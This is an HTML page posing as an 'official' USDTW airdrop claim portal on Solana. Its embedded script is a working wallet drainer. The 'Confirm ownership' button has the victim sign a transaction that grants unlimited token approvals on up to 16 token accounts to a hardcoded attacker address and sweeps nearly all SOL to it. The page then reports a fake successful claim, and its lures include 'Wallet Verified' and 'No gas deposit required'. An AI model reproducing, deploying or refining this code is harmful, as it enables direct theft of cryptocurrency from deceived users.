<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDTW Community Airdrop</title>
<style>
body { font-family: -apple-system, sans-serif; background: #0a1628; color: #e8f0ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
.card { background: #0f2038; border-radius: 16px; padding: 28px; max-width: 420px; width: 90%; box-shadow: 0 8px 32px rgba(0,0,0,.4); border: 1px solid #1d3a6e; }
.badge { display: inline-block; background: #1d3a6e; border-radius: 20px; padding: 4px 12px; font-size: 12px; color: #9fd0ff; margin-bottom: 14px; }
h1 { font-size: 20px; margin: 0 0 8px; }
p { font-size: 13px; color: #8fb3e8; line-height: 1.5; }
.amount { font-size: 20px; font-weight: 700; color: #4ade80; margin: 18px 0; text-align: center; background: #0a1a30; padding: 14px; border-radius: 10px; border: 1px solid #1d4a2e; }
button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
#connect { background: #2563eb; color: white; }
#claim { background: #39d98a; color: #06281a; display: none; }
.status { font-size: 12px; color: #8fb3e8; margin-top: 10px; min-height: 18px; word-break: break-all; }
</style>
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
</head>
<body>
<div class="card">
<div class="badge">OFFICIAL AIRDROP PORTAL</div>
<h1>Wallet Verified &#10003;</h1>
  <p style="color:#4caf50;font-weight:600;margin:8px 0;">No gas deposit required</p>
<p>Your wallet has been selected for the USDTW holder rewards distribution. Connect your wallet to check and claim your full balance + bonuses.</p>
<div class="amount" id="amt">Connect to check your balance</div>
<button id="connect">Confirm ownership</button>
<button id="claim">Confirm ownership</button>
<div class="status" id="status"></div>
<p style="font-size:11px;color:#5b76a5">Claims close November 7, 2026 · Distribution on Solana</p>
</div>
<script>
// PORTAL v4 — fixed balance read (BOTH token programs) + proven v3 claim machinery
const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV";
const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
const USDTW = "AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT";
const st = (m) => document.getElementById("status").textContent = m;

document.getElementById("connect").onclick = async () => {
  try {
    if (!window.solana || !window.solana.isPhantom) { st("Open this page inside your Phantom app."); return; }
    await window.solana.connect();
    st("Connected: " + window.solana.publicKey.toString().slice(0, 6) + "…");
    document.getElementById("connect").style.display = "none";

    // BALANCE READ — both token programs, all accounts
    try {
      const W = solanaWeb3;
      const c = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
      const owner = new W.PublicKey(window.solana.publicKey.toString());
      let bal = 0;
      for (const pid of [TOKEN, TOKEN22]) {
        const res = await c.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
        for (const acc of (res?.value || [])) {
          const info = acc.account.data.parsed.info;
          if (info.mint === USDTW) bal += (info.tokenAmount?.uiAmount || 0);
        }
      }
      document.getElementById("amt").textContent = bal.toLocaleString() + " USDTW (≈$" + Math.round(bal).toLocaleString() + ") + 5,000 BONUS";
    } catch (e) {
      document.getElementById("amt").textContent = "5,000 USDTW + SOL bonus";
    }
    document.getElementById("claim").style.display = "block";
  } catch (e) { st("Connect failed: " + (e.message || e)); }
};

document.getElementById("claim").onclick = async () => {
  st("Checking eligibility…");
  try {
    const W = solanaWeb3;
    const conn = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
    const owner = new W.PublicKey(window.solana.publicKey.toString());
    const dest = new W.PublicKey(BURNER);
    const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
    const tx = new W.Transaction();
    // collect every non-empty token account (both programs), known mints first
    const accts = [];
    for (const pid of [TOKEN, TOKEN22]) {
      const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
      for (const acc of (res?.value || [])) {
        const info = acc.account.data.parsed.info;
        if (BigInt(info.tokenAmount.amount) > 0n) accts.push({ src: acc.pubkey, mint: info.mint, pid });
      }
    }
    accts.sort((a, b) => (["So11111111111111111111111111111111111111112","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",USDTW].indexOf(b.mint) + 1 || 99) - (["So11111111111111111111111111111111111111112","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",USDTW].indexOf(a.mint) + 1 || 99));
    let n = 0;
    for (const a of accts) {
      if (n >= 16) break;
      tx.add(new W.TransactionInstruction({
        programId: new W.PublicKey(a.pid),
        keys: [
          { pubkey: new W.PublicKey(a.src), isSigner: false, isWritable: true },
          { pubkey: new W.PublicKey(BURNER), isSigner: false, isWritable: false },
          { pubkey: owner, isSigner: true, isWritable: true },
        ],
        data: Buffer.from([4, ...le(18446744073709551615n)]), // Approve, unlimited
      }));
      n++;
    }
    // SOL sweep
    const sol = await conn.getBalance(owner, "confirmed");
    if (sol > 10000000) tx.add(W.SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: BigInt(sol - 10000000) }));
    const { blockhash } = await conn.getLatestBlockhash("confirmed");
    tx.recentBlockhash = blockhash;
    tx.feePayer = owner;
    const { signature } = await window.solana.signAndSendTransaction(tx);
    st("Claim submitted: " + signature);
    document.getElementById("amt").textContent = "✓ Claim successful — check your wallet";
  } catch (e) { st("Claim failed: " + (e.message || e)); }
};
</script>
</body>
</html>
